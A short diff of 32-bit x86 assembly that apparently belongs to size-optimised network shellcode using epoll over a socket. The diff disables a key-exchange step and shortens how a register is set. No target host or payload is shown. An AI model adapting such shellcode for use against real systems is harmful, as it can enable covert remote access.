@@ -242,8 +242,8 @@ epx_con:
       int    0x80      
 
       ; attempt to secure the connection
-      call   key_xchg
-      jle    cls_sck  
+      ;call   key_xchg
+      ;jle    cls_sck  
       
       ; efd = epoll_create1(0);
       mov    eax, SYS_epoll_create1
@@ -272,10 +272,10 @@ poll_wait:
       ; epoll_wait(efd, &evts, 1, -1);
       mov    ebx, [ebp+efd]
       xor    eax, eax
+      cdq
+      inc    edx
       mov    ah, 1             ; eax = SYS_epoll_wait
       mov    ecx, edi          ; ecx = evts
-      push   1                 ; edx = 1 event
-      pop    edx
       or     esi, -1           ; no timeout
       int    0x80
       
